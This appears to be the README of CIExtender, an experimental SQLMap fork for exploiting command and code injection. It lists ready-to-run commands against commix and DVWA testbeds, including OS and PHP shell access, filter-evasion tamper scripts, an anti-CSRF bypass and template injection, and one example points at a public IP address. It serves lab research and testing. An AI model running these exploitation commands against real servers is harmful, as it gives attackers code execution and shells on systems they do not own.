# CIExtender

*Try to read the wiki for technical brainfuck*

Based on SQLMap **1.4.12.16#dev** . Hopefully I will update to the latest version at some point.

## What it is not

1 CIExtender is not a ready to use tool. It needs heavy lifting, it needs code cleanup, it has many bugs, the queries/payloads/vectors/boundaries need changes and much more.


2 This is not a replacement of SQLMap. CIExtender is totaly experimental. I don't know if I am going to work on this project, in contrast with SQLMap which is actively maintained.


3 This is not a replacement for commix or any other tool of this kind. CIExtender is not a ready to use tool. Read again 1.


4 It does not demonstrate a new or previously unknown knowledge. It does not demonstrate new payloads or attack vectors. 


## What it is

It is mostly a Proof of Concept. It's a proof of concept that SQLMap is a fucking amazing tool and it can be used for many  more things than SQL Injections, with minor changes.


It's a project, which started mostly to satisfy my curiosity. I was curious if the features of SQLMap could be used for Code Injections and it seems they can.


I was planning to release it as an "Extension" for SQLMap and not as a standalone and hopefully this is what I will do in the near future. However, I am still experimenting, so I'll leave it as is.

# PoC 

Like I said, this is mostly a PoC that you can do a lot with SQLMap . 

In the following sections I present some test cases and the command which will allow you to detect and exploit the specific scenario.

## Commix Test Bed

(more words for the amazing project of commix at "Reference" section)

[![](http://img.youtube.com/vi/VyFajtMD0R0/0.jpg)](http://www.youtube.com/watch?v=VyFajtMD0R0 "")

```
Classic regular example
python3 CIExtender.py -u http://www.local.con/commix-testbed/scenarios/regular/GET/classic.php?addr=* -v1 --flush-session

Classic (Base64) regular example
(default sqlmap tamper script)
python3 CIExtender.py -u http://www.local.con/commix-testbed/scenarios/regular/GET/classic_b64.php?addr=* -v1 --flush-session --tamper=base64encode

Classic (Hex) regular example
(custom tamper script)
python3 CIExtender.py -u http://www.local.con/commix-testbed/scenarios/regular/GET/classic_hex.php?addr=* -v1 --flush-session --tamper=hex_encode

Classic single-quote example
python3 CIExtender.py -u http://www.local.con/commix-testbed/scenarios/regular/GET/classic_quote.php?addr=* -v1 --flush-session

Classic double-quote example
python3 CIExtender.py -u http://www.local.con/commix-testbed/scenarios/regular/GET/classic_double_quote.php?addr=* -v1 --flush-session

Classic blacklisting example
(custom tamper script)
python3 CIExtender.py -u http://www.local.con/commix-testbed/scenarios/regular/GET/classic_blacklisting.php?addr=* -v1 --flush-session --tamper=shell_tamper

Classic non-space example
(custom tamper script)
python3 CIExtender.py -u http://www.local.con/commix-testbed/scenarios/regular/GET/classic_non_space.php?addr=* -v1 --flush-session --tamper=bash_no_space

Classic hashing example
python3 CIExtender.py -u http://www.local.con/commix-testbed/scenarios/regular/GET/classic_hash.php?string=* -v1 --flush-session

Classic example & Basic HTTP Authentication
python3 CIExtender.py -u http://www.local.con/commix-testbed/scenarios/regular/GET/classic_basic_auth.php?addr=* -v1 --flush-session --auth-type "BASIC" --auth-cred="admin:admin"

Classic example & Digest HTTP Authentication
python3 CIExtender.py -u http://www.local.con/commix-testbed/scenarios/regular/GET/classic_digest_auth.php?addr=* -v1 --flush-session --auth-type "DIGEST" --auth-cred="admin:admin"

Blind regular example
python3 CIExtender.py -u http://www.local.con/commix-testbed/scenarios/regular/GET/blind.php?addr=a* -v1 --flush-session --time-sec 40

Double Blind regular example
python3 CIExtender.py -u http://www.local.con/commix-testbed/scenarios/regular/GET/double_blind.php?addr=a* -v1 --flush-session --time-sec 40

Eval regular example
Detection::
python3 CIExtender.py -u http://local.con/commix-testbed/scenarios/regular/GET/eval.php?user=* -v1 --flush-session 

PHP shell:
python3 CIExtender.py -u http://local.con/commix-testbed/scenarios/regular/GET/eval.php?user=* -v1 --flush-session --sql-shell
php-shell> phpversion()

OS shell
python3 CIExtender.py -u http://local.con/commix-testbed/scenarios/regular/GET/eval.php?user=* -v1 --flush-session --os-shell
os-shell> whoami

Eval (Base64) regular example
python3 CIExtender.py -u http://local.con/commix-testbed/scenarios/regular/GET/eval_b64.php?user=* -v1 --flush-session --tamper=base64encode

Preg_match() regular example
python3 CIExtender.py -u http://local.con/commix-testbed/scenarios/regular/GET/preg_match.php?addr=127.0.0.1* -v1 --flush-session

Preg_match() blind example
python3 CIExtender.py -u http://local.con/commix-testbed/scenarios/regular/GET/preg_match_blind.php?addr=127.0.0.1* -v1 --flush-session --time-sec 40

Preg_Replace() regular example //not with new php
python3 CIExtender.py "http://local.con/commix-testbed/scenarios/regular/GET/preg_replace.php?replace=/Hello/e&with=*" -v1 --flush-session

Assert() regular example
python3 CIExtender.py -u http://157.230.2.20/assert.php?user=* -v1 --flush-session

Str_Replace() regular example
python3 CIExtender.py -u http://local.con/commix-testbed/scenarios/regular/GET/str_replace.php?user=* -v1 --flush-session --tamper=php_send2header

Create_Function() regular example
python3 CIExtender.py -u http://local.con/commix-testbed/scenarios/regular/GET/create_function.php?user=* -v1 --flush-session


-------POST---------

Classic (SOAP/XML) regular example
python3 CIExtender.py -r /tmp/classic_xml.sqli -v1 --flush-session

Blind (JSON) regular example
python3 CIExtender.py -r /tmp/blind_json.sqli -v1 --flush-session --time-sec 40

Regex for domain name validation
python3 CIExtender.py -r /tmp/lax_domain_name.sqli -v1 --flush-session

Nested quotes
python3 CIExtender.py -r /tmp/nested_quotes.sqli -v1 --flush-session

Regex filter for spaces
python3 CIExtender.py -r /tmp/no_space.sqli -v1 --flush-session --tamper=bash_no_space

Regex filter for white chars
python3 CIExtender.py -r /tmp/no_white_chars.sqli -v1 --flush-session --tamper=bash_no_space

Alphanum for input start
python3 CIExtender.py -r /tmp/simple_start_alphanum.sqli -v1 --flush-session

Alphanum for input end
python3 CIExtender.py -r /tmp/simple_stop_alphanum.sqli -v1 --flush-session

Alphanum for input end (filter for white chars)
python3 CIExtender.py -r /tmp/no_white_chars_stop_alnum.sqli -v1 --flush-session --tamper=bash_no_space

Regex filter for OS commands (Windows / *nix)
Note: this tamper has not been developed for this kind of bypasses. If for some reason the resulted base64 string contains any of the banned words, it will fail.
python3 CIExtender.py -r /tmp/multiple_os_commands_blacklisting.sqli -v1 --flush-session --tamper=bash_no_space

Eval user-agent-based example
python3 CIExtender.py -r /tmp/ua\(eval\).sqli -v1 --flush-session
```

The files for the POST scenarios, can be found in the *testbed/commix_requests* folder.

## DVWA Test Bed

```
python3 CIExtender.py -u "http://local.con/DVWA-master/vulnerabilities/exec/index.php" --data="ip=*&Submit=Submit&user_token="  --flush-session --cookie="security=medium; PHPSESSID=fm1i182tfqk0hak3mt5ocssfo7" --batch -v1 --tamper=bash_no_space

python3 CIExtender.py -u "http://local.con/DVWA-master/vulnerabilities/exec/index.php" --data="ip=*&Submit=Submit&user_token="  --flush-session --cookie="security=low; PHPSESSID=fm1i182tfqk0hak3mt5ocssfo7" --batch -v1
```

*Of course you can pass the high level. Just create the tamper script it needs ;-)* 

## Anti-CSRF token bypass

This is the medium challenge from the DVWA in which I have added the anti-CSRF token. 

Install the DVWA and replace the file **vulnerabilities/exec/source/impossible.php** with the one from the "testbed" folder in this repo. Then play the command injection in the "impossible" level.

```
python3 CIExtender.py -u "http://local.con/DVWA-master/vulnerabilities/exec/index.php" --csrf-token="user_token" --csrf-url="http://local.con/DVWA-master/vulnerabilities/exec/index.php" --data="ip=*&Submit=Submit&user_token="  --flush-session --cookie="security=impossible; PHPSESSID=fm1i182tfqk0hak3mt5ocssfo7" --batch -v1 --tamper=bash_no_space
```

## More scenarios

While I was testing the various "challenges", the possibilities and the functionalities, I created some testing scenarios in order to check different ideas.

I created the second_order.php, in order to test if the *-second-url* of SQLMap is working, and it is!
```
python3 CIExtender.py -u http://127.0.0.1/second_order.php?cmd=* -v1 --sql-shell --flush-session --second-url http://127.0.0.1/test.txt
```

I used the FlaskApp from  https://0day.work/jinja2-template-injection-filter-bypasses/ in order to check if I could detect template injections:

```
python3 CIExtender.py -u http://127.0.0.1/Flask/?name=* -v1 --hostname --dbms=shell --skip-urlencode --flush-session
```
Please note, that this needs many fixes. I have used an "inference query" which I don't like, because I wanted to check if I can exploit template injections. This is not the "right" SQLMap's way to do it. I have to create a new database for template injection. I leave it for now, just to present this capability.

# More words

## No Guaranties

Please understand, that this is an experiment of mine. I though that others may also have the same curiosity and this is why I make it public. If you like it and you find it useful in some cases, use it. If not , don't use it ¯\_(ツ)_/¯

If you share the same curiosity and interest with me and believe that there is something interesting here, please feel free to suggest and create pull requests. But also please keep in mind, that I have a personal life so I don't guarantee that I will have a good response time :-)

## I have not a reference for your code

Sorry for that :-( . 

I will try to reference everyone, either inside the code whenever I use a "paste", or at the end of this document. 

If for any reason I have not referenced you, let me know and I will add it. But please let me make clear that *"if ( 1 < 2 )"* is not your code and I am not going to refernce you for that. The php documentation is not your code either, and *"eval echo 1"* is not your payload.

# References

This is basicaly the SQLMap and I have added functionalities. So, the flame for the shitty code and the additional bugs is on me. The good words for the amazing functionality is on them: http://sqlmap.org/ .

For my experiments I used the testbed from commix because it is the most comprehensive testbed I know of, for Command Injections : https://github.com/commixproject/commix-testbed 

I also used the Damn Vulnerable Web App (DVWA) for some test scenarios: https://dvwa.co.uk/ 

Whenever I was not able to find the appropriate payload, I was watching commix in action: https://commixproject.com/ . If you want something stable, ready to use and specialized on OS Command Injections, use commix. I am a very lazy person and I am not planning to re-invent the wheel. Anastasios Stasinopoulos has done a great job with commix and its payloads, so probably many payloads may already exist in his project. 

If you want to understand OS Command Injections read the paper work "Commix: Detecting and exploiting command injection flaws" of [@ancst](https://twitter.com/ancst) 

For the flask testbed and the payloads for the Jinja template injection, you can read more at https://0day.work/jinja2-template-injection-filter-bypasses/ 

